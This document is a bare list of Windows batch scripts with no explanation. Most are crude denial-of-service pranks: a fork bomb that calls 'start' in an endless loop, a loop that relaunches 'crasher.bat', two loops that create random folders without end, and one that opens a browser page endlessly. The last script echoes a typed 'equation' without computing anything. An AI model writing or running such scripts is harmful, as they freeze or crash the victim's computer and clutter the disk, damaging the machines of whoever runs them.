@echo off
:A
start 
goto A

@echo off
:folder
md %random%
goto folder

@echo off
:G
start www.google.com
goto G

@echo off
cls
:A
start crasher.bat
goto A

@echo off
:A
mkdir %random%
goto A

@echo off 
set /p math=equation
echo %math%
pause
